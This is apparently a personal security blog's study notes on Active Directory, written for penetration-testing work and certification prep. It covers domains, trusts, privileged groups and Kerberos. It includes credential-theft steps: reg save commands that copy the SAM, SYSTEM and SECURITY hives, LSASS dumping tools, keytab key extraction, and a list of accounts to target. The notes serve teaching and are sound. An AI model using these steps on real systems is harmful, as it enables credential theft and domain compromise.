<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Active Directory. An overview :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Basic Overview/ Definitions  Directory – Contains all the information about the objects of the Active directory Object – An object references almost anything inside the directory (a user, group, shared folder&amp;hellip;) Domain – The objects of the directory are contained inside the domain. Inside a &amp;ldquo;forest&amp;rdquo; more than one domain can exist and each of them will have their own objects collection. Tree – Group of domains with the same root." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/research/activedirectory/everything-about-ad/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Active Directory. An overview :: Research blog">
<meta property="og:description" content="To learn more about Active Directory to improve my netsec skills for engagements and for OSCP/CRT prep I started accumulating notes in my own words about how each section of Active Directory works." />
<meta property="og:url" content="https://thomas-byrne.co.uk/research/activedirectory/everything-about-ad/" />
<meta property="og:site_name" content="Active Directory. An overview" />

  <meta property="og:image" content="https://thomas-byrne.co.uk">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-10 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/oscp">OSCP</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more ▾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/research/activedirectory/everything-about-ad/">Active Directory. An overview</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-10 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk" class="post-cover" alt="Active Directory. An overview" />
  

  

  <div class="post-content"><div>
        <h1 id="basic-overview-definitions">Basic Overview/ Definitions<a href="#basic-overview-definitions" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ul>
<li><strong>Directory</strong> – Contains all the information about the objects of the Active directory</li>
<li><strong>Object</strong> – An object references almost anything inside the directory (a user, group, shared folder&hellip;)</li>
<li><strong>Domain</strong> – The objects of the directory are contained inside the domain. Inside a &ldquo;forest&rdquo; more than one domain can exist and each of them will have their own objects collection.</li>
<li><strong>Tree</strong> – Group of domains with the same root. Example: <em>dom.local, email.dom.local, <a href="http://www.dom.local">www.dom.local</a></em></li>
<li><strong>Forest</strong> – The forest is the highest level of the organization hierarchy and is composed by a group of trees. The trees are connected by trust relationships.</li>
</ul>
<p>Active Directory provides several different services, which fall under the umbrella of &ldquo;Active Directory Domain Services,&rdquo; or AD DS.</p>
<ul>
<li><strong>Domain Services</strong> – stores centralized data and manages communication between users and domains; includes login authentication and search functionality</li>
<li><strong>Certificate Services</strong> – creates, distributes, and manages secure certificates</li>
<li><strong>Lightweight Directory Services</strong> – supports directory-enabled applications using the open (LDAP) protocol</li>
<li><strong>Directory Federation Services</strong> – provides single-sign-on (SSO) to authenticate a user in multiple web applications in a single session</li>
<li><strong>Rights Management</strong> – protects copyrighted information by preventing unauthorized use and distribution of digital content</li>
<li><strong>DNS Service</strong> – Used to resolve domain names.</li>
</ul>
<h2 id="ad-database-file">AD Database file<a href="#ad-database-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p><code>%SYSTEM ROOT%/NTDS.NTDS.dit</code></p>
<h1 id="domain-controllers">Domain Controllers<a href="#domain-controllers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Just a server running <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">Active Directory Domain Service</a> (AD DS) that processes all user requests such as authentication, authorisation and Name Resolution etc.</p>
<p>Any computer in the domain must be able to talk with the Domain Controller in order to ask for information of this database. So the Domain Controller (at least one of them) should be reachable from any part of the network.</p>
<p>Domain Controllers must be synchronized with each other to keep the data up to date. [[Everything about AD#DCSYNC]]</p>
<h2 id="finding-dcs">FInding DC&rsquo;s<a href="#finding-dcs" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Due to the wide range of services offered by the domain controller, there are many ways to identify the domain controllers of a domain.</p>
<p>One possibility that doesn&rsquo;t require any type of authentication is to make a simple <strong>DNS query asking for the LDAP servers</strong> of the domain (which are the domain controllers):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\Anakin&gt; nslookup -q=srv _ldap._tcp.dc._msdcs.contoso.local
Server<span style="color:#960050;background-color:#1e0010">:</span>  UnKnown
Address<span style="color:#960050;background-color:#1e0010">:</span>  192.168.100.2

_ldap._tcp.dc._msdcs.contoso.local      SRV service location<span style="color:#960050;background-color:#1e0010">:</span>
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = dc01.contoso.local
_ldap._tcp.dc._msdcs.contoso.local      SRV service location<span style="color:#960050;background-color:#1e0010">:</span>
          priority       = 0
          weight         = 100
          port           = 389
          svr hostname   = dc02.contoso.local
dc01.contoso.local      internet address = 192.168.100.2
dc02.contoso.local      internet address = 192.168.100.3
</code></pre></div><p>Also if you do a port scan of a machine and the result is similar to the following, surely is a domain controller:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap 192.168.100.2 -Pn -sV -p-
Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times will be slower.
Starting Nmap 7.91 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-05-04 11:17 CEST
Nmap scan report <span style="color:#66d9ef">for</span> 192.168.100.2
Host is up <span style="color:#f92672">(</span>0.00068s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65509</span> filtered ports
PORT      STATE SERVICE       VERSION
42/tcp    open  tcpwrapped
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-05-04 09:19:44Z<span style="color:#f92672">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: contoso.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: contoso.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 164.31 seconds
</code></pre></div><p>Nmap service scan of a Domain Controller</p>
<p>This output show a lot of ports open. Here is a brief description of the service offer by each port:</p>
<ul>
<li>42 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#netbios-name-service">WINS</a>: Centralized service to resolve NetBIOS names to IP addresses.</li>
<li>53 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#dns">DNS</a>: Service to resolve DNS names to IP addresses.</li>
<li>88 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos">Kerberos</a>: Used to provide Kerberos authentication to users.</li>
<li>135 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#rpc">RPC</a> Endpoint Mapper: RPC service used to find the RPC endpoints for different RPC services.</li>
<li>139 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#netbios">NetBIOS</a> Session Service: An old alternative to TCP used by Windows computers. It allows to transport protocols like SMB or RPC.</li>
<li>389 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#ldap">LDAP</a>: Used to query/edit the <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#database">domain database</a>.</li>
<li>445 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#smb">SMB</a>: Used to share files between computers. Also allow RPC calls through named pipes.</li>
<li>464 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#kerberos">kpasswd</a>: Kerberos service used to change users passwords.</li>
<li>593 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#rpc">RPC</a> over HTTP Endpoint Mapper</li>
<li>636 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#ldap">LDAPS</a>: LDAP with SSL</li>
<li>3268 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#ldap">LDAP</a> <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#global-catalog">Global Catalog</a>: A service to query the Global Catalog.</li>
<li>3269 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#ldap">LDAPS</a> <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#global-catalog">Global Catalog</a></li>
<li>5985 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#winrm">WinRM</a>: Service to manage the machine remotely with CIM objects or Powershell remoting.</li>
<li>9389 -&gt; <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#adws">ADWS</a>: Web service to query/edit the <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#database">domain database</a>.</li>
<li>49152-65535 <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#rpc">RPC</a> Endpoints: Random RPC ports where different RPC services/interfaces listen to clients.</li>
</ul>
<h1 id="domain-trusts">Domain Trusts<a href="#domain-trusts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Microsoft considers that the <strong>domain isn&rsquo;t a Security Boundary</strong>, the <strong>Forest is the security Boundary</strong>. This means that <strong>if you compromise a domain inside a Forest you are going to be able to compromise the entire Forest</strong>.</p>
<p>A domain trust establishes the ability for a user in one domain to authenticate to another domain to access resources or act as a security principal.</p>
<h2 id="trust-direction">Trust Direction<a href="#trust-direction" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<blockquote>
<p>A Domain Trust Direction is the opposite to the access direction</p>
</blockquote>
<pre tabindex="0"><code> (trusting)         trusts        (trusted)
  Domain A  --------------------&gt;  Domain B
       outgoing               incoming
       outbound               inbound
</code></pre><ul>
<li>Inbound Trusts: Incoming trusts allow users of your domain to access the other domain</li>
<li>Outbound Trusts: Outbound trusts allow users of another domain to access your domain</li>
</ul>
<p>When a 2 domains establish a trust, keys are exchanged. These keys are stored in the Domain Controllers at the base of the trust.</p>
<h2 id="trusted-accounts">Trusted Accounts<a href="#trusted-accounts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>When an trust is established, an associated user object is created in each domain to store the trust key. This will look like a normal user/computer account for example <code>CONTOSO$</code>. The name of the user is the NetBIOS name of the other domain, finished in <code>$</code>. For example, in case of the trust between the domains <code>FOO</code> and <code>BAR</code>, the <code>FOO</code> domain would store the trust key in the <code>BAR$</code>user, and the <code>BAR</code> domain would store it in the <code>FOO$</code> user. If you can [get the secrets](<a href="https://zer1t0.gitlab.io/posts/attacking_ad/Domain">https://zer1t0.gitlab.io/posts/attacking_ad/Domain</a> database dumping) of this account, you can create <a href="https://adsecurity.org/?p=1588">inter-realm Kerberos tickets</a>.</p>
<p>When a user tries to access a resource in the trusted domain (DC2), the trusting domain (DC2) will require a inter-realm TGT to the DC of its domain (DC1). The DC (DC1) will serve the client with this TGT which would be encrypted/ signed with the inter-realm key (the key both domains exchanged). The client will then access the DC (DC2) of the other domain and will request a TGS for the service using the inter-realm TGT.</p>
<p>![[Pasted image 20220613120102.png]]</p>
<p>It&rsquo;s important to notice that <strong>a trust can be 1 way or 2 ways</strong>. In the 2 ways options, both domains will trust each other, but in the <strong>1 way</strong> trust relation one of the domains will be the <strong>trusted</strong> and the other the <strong>trusting</strong> domain. In the latter, you will only be able to access resources inside the trusting domain from the trusted one.</p>
<p>A trust relationship can also be <strong>transitive</strong> (A trust B, B trust C, then A trust C) or <strong>non-transitive</strong>. Non transitive trusts can only be used by two parties, the trusting and the trusted domain.</p>
<p><strong>Different trusting relationships:</strong></p>
<ul>
<li>Parent/Child
<ul>
<li>Implicit two way trust between a child node and its parent (most common)</li>
</ul>
</li>
<li>Cross-link</li>
<li>External
<ul>
<li>Implicitly non-transitive trust created between disparate domains.</li>
</ul>
</li>
<li>Tree-root
<ul>
<li>Implicit two-way transitive trust between the forest root domain and the new tree root you&rsquo;re adding.</li>
</ul>
</li>
<li>Forest
<ul>
<li>A transitive trust between one forest root domain and other forest root domain.</li>
</ul>
</li>
<li>MIT</li>
</ul>
<h2 id="attack-paths">Attack paths<a href="#attack-paths" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ol>
<li>Enumerate the trusting relationships</li>
<li>Check is any security principals (users/groups/computers) can access resources on another domain</li>
<li>Compromise the accounts which can pivot through domains</li>
</ol>
<p>There are 3 mains ways security principals can access resources in another domain:</p>
<ol>
<li>They can be added to local groups on individual machines i.e. local &ldquo;Administrators group on a server&rdquo;</li>
<li>They can be added to groups in the foreign domain.</li>
<li>They can be added as principals in access control lists, i.e. in ACEs in a DACL.</li>
</ol>
<p>A DACL stands for Discretionary Access Control List, in Microsoft Windows family, is <strong>an internal list attached to an object in Active Directory that specifies which users and groups can access the object and what kinds of operations they can perform on the object</strong>.</p>
<p>Access privileges for resources in Active Directory Domain Services are usually granted through the use of an access control entry (ACE)</p>
<p>Exploiting ACE and DACLS:
<a href="https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf">https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf</a></p>
<p>Exploiting one way trusts:
<a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted">https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted</a></p>
<h1 id="users">Users<a href="#users" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>To easily manage users in AD they are stored as objects in the central database (ntds.dit)</p>
<h2 id="user-identifiers">User identifiers<a href="#user-identifiers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>The user object stores lots of different data such as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">PS C:\Users\Anakin&gt; Get-ADUser Anakin


DistinguishedName <span style="color:#960050;background-color:#1e0010">:</span> CN=Anakin,CN=Users,DC=contoso,DC=local
Enabled           <span style="color:#960050;background-color:#1e0010">:</span> True
GivenName         <span style="color:#960050;background-color:#1e0010">:</span> Anakin
Name              <span style="color:#960050;background-color:#1e0010">:</span> Anakin
ObjectClass       <span style="color:#960050;background-color:#1e0010">:</span> user
ObjectGUID        <span style="color:#960050;background-color:#1e0010">:</span> 58ab0512-9c96-4e97-bf53-019e86fd3ed7
SamAccountName    <span style="color:#960050;background-color:#1e0010">:</span> anakin
SID               <span style="color:#960050;background-color:#1e0010">:</span> S-1-5-21-1372086773-2238746523-2939299801-1103
Surname           <span style="color:#960050;background-color:#1e0010">:</span>
UserPrincipalName <span style="color:#960050;background-color:#1e0010">:</span> anakin@contoso.local
</code></pre></div><p>The SamAccountName is the actual username of the user and will be needed to reference them.</p>
<p>SID = Domain SID + Relative Identifier (RID)</p>
<h2 id="user-secrets">User secrets<a href="#user-secrets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>All user secrets are kept encrypted within the AD database file.</p>
<ul>
<li>NT hash (and LM hash for older accounts)</li>
<li>Kerberos keys</li>
</ul>
<h3 id="ntlm-hashes">NT/LM hashes<a href="#ntlm-hashes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>NT and LM hashes are both stored in the local Windows SAM files as well as ntds.dit to authenticate the local and domain users respectively.</p>
<p>NT and LM hashes are separate things - LM hashes are old and weak, NT hashes are newer and more secure. However these are sometimes called NTLM hashes which can be confused with hashses used by the NTLM protocol which are actually called NTLM hashes.</p>
<h3 id="kerberos-keys">Kerberos keys<a href="#kerberos-keys" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>These are also stored in ntds.dit and are derived from the users password and used in Kerberos authentication</p>
<h3 id="useraccountcontro-">UserAccountContro-<a href="#useraccountcontro-" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>This is not talking about the UAC prompt to run elevated programs</p>
<p>This is a property of the user class that defines a series of flags that are relevant for security:</p>
<ol>
<li><code>ACCOUNTDISABLE</code> - Account is disabled and cannot be used</li>
<li><code>DONT_REQUIRE_PREAUTH</code> - The account doesn&rsquo;t require pre-authentication</li>
<li><code>NOT_DELEGATED</code> - This account cannot be delegated through Kerberos delegation</li>
<li><code>TRUSTED_FOR_DELEGATION</code> - Keberos unconstrained delegation is enabled for this account (can be used to authenticate as any user in the domain - very powerfull - see <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation">here</a></li>
<li><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> - Kerberos S4U2Self extension is enabled</li>
</ol>
<p>Other useful properties:</p>
<ol>
<li><code>msDS-AllowedToDelegateTo</code> -  Constrained delegation! - Kerberos S4U2Self (see <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution">here</a>)</li>
<li>SPN (ServicePrincipalName)</li>
</ol>
<h3 id="accounts-to-target">Accounts to target<a href="#accounts-to-target" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<ul>
<li>BuiltIn Administrator account - most powerful account</li>
<li>krbtgt account - its secrets (NT hash and Kerberos keys) are used to encrypt tickets (specifically TGTs) -  if you can compromise this account you can create Golden Tickets [[Everything about AD#Golden ticket]]</li>
</ul>
<h1 id="groups">Groups<a href="#groups" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>AD groups are generated to associate permissions to a large pool of users. For example access to grant users permissions to access a specific SMB share, the will need to be added to the necessary AD group that provides Read/Write access to this share.</p>
<p>Groups make managing permissions much easier as you can just add or remove users from groups as needed to assign permissions rather than doing it individually for each user.</p>
<h2 id="important-groups">Important groups<a href="#important-groups" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="domain-administrators">Domain Administrators<a href="#domain-administrators" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Gives administrator privileges to its members in the domain.</p>
<h3 id="dnsadmins">DNSAdmins<a href="#dnsadmins" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins">DNSAdmins</a> group can allow to its members to <a href="https://www.semperis.com/blog/dnsadmins-revisited/">execute code in Domain Controllers</a> as <code>SYSTEM</code> by using an arbitrary DLL.</p>
<h3 id="protected-users">Protected Users<a href="#protected-users" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The <a href="https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group">Protected Users</a> group allows to enforce the security of accounts. Their members are not allowed to:</p>
<ul>
<li>Authenticate with NTLM (only Kerberos).</li>
<li>Use DES or RC4 encryption types in Kerberos pre-authentication.</li>
<li>Be delegated with unconstrained or constrained delegation.</li>
<li>Renew the Kerberos TGTs beyond the initial four-hour lifetime.</li>
</ul>
<p>This can frustrate attempts to abuse of these account through <a href="https://en.hackndo.com/ntlm-relay/">NTLM relay</a> or <a href="https://www.tarlogic.com/en/blog/kerberos-iii-how-does-delegation-work/">Kerberos Delegation</a> attacks.</p>
<h3 id="schema-admins">Schema Admins<a href="#schema-admins" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#schema-admins">Schema Admins</a> can modify the Active Directory <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#database">database</a> schema.</p>
<h3 id="account-operators">Account Operators<a href="#account-operators" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators">Account Operators</a> group can modify the members of many groups of the domain, excluding many of the administrators groups. However it can modify the Server Operators group.</p>
<h3 id="backup-operators">Backup Operators<a href="#backup-operators" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The members of <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#backup-operators">Backup Operators</a> can back up and restore files in Domain Controllers (they also can log in to them). This could allow to modify files in Domain Controllers.</p>
<h3 id="print-operators">Print Operators<a href="#print-operators" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators">Print Operators</a> can log into the Domain Controllers.</p>
<h3 id="server-operators">Server Operators<a href="#server-operators" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#server-operators">Server Operators</a> can log on in Domain Controllers and manage its configuration.</p>
<h3 id="remote-desktop-users">Remote Desktop Users<a href="#remote-desktop-users" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The members of <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-remotedesktopusers">Remote Desktop Users</a> can log on in a Domain Controller through <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#rdp">RDP</a>.</p>
<h3 id="group-policy-creator-owners">Group Policy Creator Owners<a href="#group-policy-creator-owners" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The members of <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#group-policy-creator-owners">Group Policy Creator Owners</a> can edit <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#group-policy">GPOs</a> in the domain.</p>
<h1 id="windows-computer-connections">Windows Computer Connections<a href="#windows-computer-connections" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Here are a few different ways you can connect to machines either remotely or within the domain/forest</p>
<h2 id="rpc-with-smb">RPC with SMB<a href="#rpc-with-smb" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Tools such as PsExec, WmiExec can allow you to acheive code execution with RPC over SMB. These tools usually execute commands by using some RPC interface and send/receive the input/output by using SMB pipes.</p>
<p>Normally, the tools only require the 445 port (SMB) open in order to execute commands, but some like <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a> will also need the port 135 (RPC over TCP).</p>
<h2 id="psremoting">PsRemoting<a href="#psremoting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="rdp">RDP<a href="#rdp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h1 id="credentials">Credentials<a href="#credentials" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h2 id="lsass">LSASS<a href="#lsass" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>In Windows credentials can be found in memory, typically in the <code>lsass.exe</code> process. LSASS is responsible for many security related operations, including users authentication.</p>
<p>When a user performs an interactive logon, either by physically accessing the machine or through RDP, the credentials are cached in LSASS in order to use SSO when network logon will be required to access other domain computers.</p>
<p>Accessing the LSASS memory i.e. to dump it, requires the <code>SeDebugPrivilege</code>. Tools such as mimikatz, procdump, comsvcs.dll, or werfault.exe can be used to achieve this. Once dumped mimikatz can be used to dump creds offline.</p>
<h2 id="sam">SAM<a href="#sam" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>The SAM (Security Account Manager) is a hive file (basically an encrypted text file) that stores passwords of local user accounts used for local authentication.</p>
<p>This is useful to check as sometimes organisations set the local Administrator password as the same in the Domain computers.</p>
<p>To read extract passwords from the SAM hive you will need the SYSTEM and SECURITY hive files to decrypt the file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\&gt;</span>reg save HKLM<span style="color:#ae81ff">\S</span>YSTEM system.bin
The operation completed successfully.

C:<span style="color:#ae81ff">\&gt;</span>reg save HKLM<span style="color:#ae81ff">\S</span>ECURITY security.bin
The operation completed successfully.

C:<span style="color:#ae81ff">\&gt;</span>reg save HKLM<span style="color:#ae81ff">\S</span>AM sam.bin
The operation completed successfully.
</code></pre></div><p>To crack <a href="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials">Domain Cached Credentials</a> you will need to save them in the following format and then use hashcat :</p>
<ul>
<li><code>$DCC2$10240#username#hash</code></li>
</ul>
<h2 id="laps">LAPS<a href="#laps" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>LAPS is not a place to find passwords but a solution used to manage Administrator passwords across a domain. LAPS ensures every Administrator password is unique to prevent multiple devices becoming compromised if one credential is found.</li>
</ul>
<h2 id="registry">Registry<a href="#registry" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h2 id="linux-credentials">Linux credentials<a href="#linux-credentials" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>Unfortunately Linux devices don&rsquo;t have an LSASS process to store cached credentials but there can be some interesting files.</p>
<h3 id="linux-kerberos-tickets">Linux Kerberos tickets<a href="#linux-kerberos-tickets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>Look inside <code>/etc/krb5.keytab</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">klist -k -Ke

Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   <span style="color:#ae81ff">1</span> r2d2@contoso.local <span style="color:#f92672">(</span>DEPRECATED:arcfour-hmac<span style="color:#f92672">)</span>  <span style="color:#f92672">(</span>0xc49a77fafad6d3a9270a8568fa453003<span style="color:#f92672">)</span>

</code></pre></div><h1 id="ldap">LDAP<a href="#ldap" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Lightweight Directory Access Protocol. T</p>
<h1 id="kerberos">Kerberos<a href="#kerberos" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<p>Kerberos is an authentication protocol, <strong>not authorization</strong>. It is used to identify each user who provides a password. It does not validate which resources or services the user can access.</p>
<p>Kerberos provides information about the privileges of each user, but it is the responsibility of each service to determine if the user has access to its resources.</p>
<p>When using Kerberos authentication you will need to pass as target to the tools the hostname (DNS name or NetBIOS name) of the remote machine instead of its IP. This is cause Kerberos authentication uses the hostname to identify the <a href="https://zer1t0.gitlab.io/posts/attacking_ad/#services">service</a> of the remote machine and provide the right ticket to authenticate against it.</p>
